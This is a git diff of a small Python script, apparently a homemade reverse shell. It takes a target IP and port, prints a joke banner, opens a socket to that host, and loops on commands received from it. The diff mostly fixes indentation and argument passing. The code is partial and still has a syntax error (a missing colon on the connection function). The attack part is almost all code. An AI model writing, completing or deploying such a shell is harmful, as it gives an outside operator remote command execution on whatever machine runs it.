@@ -10,7 +10,7 @@ def arguments():
     parser.add_argument('-t', '--target', metavar='1.1.1.1', type=str)
     parser.add_argument('-p', '--port', metavar='6969', type=int)
     args = parser.parse_args()
-
+    return(args)
 
 def logo():
     print ("""
@@ -21,7 +21,7 @@ Hit or miss, I guess they never miss.. huh?
     
     """)
 
-def preparation():
+def preparation(args):
     """ Checks the cli arguments for network details and requests them if not supplied. """
     target = args.target
     port = args.port
@@ -42,15 +42,15 @@ def preparation():
 #going to refactor below when I have more time.
 def connection(networking)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	try:
-		s.connect(networking)
+    try:
+        s.connect(networking)
     except socket.error:
         print("Connection Failed.")
-		exit(1)
+        exit(1)
     CMD = subprocess.Popen(['echo', 'pittsux'], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     s.send(CMD.stdout.read())
     while True:
-		#Not sure about this.
+        #Not sure about this.
         command = s.recv(1024)
         if 'exit' in command:
             s.close()
@@ -63,6 +63,7 @@ def connection(networking)
 
                   
 def main():
-	logo()
-	networking = arguments()
-	connection(networking)
+    logo()
+    args = arguments()
+    networking = preparation(args)
+    connection(networking)
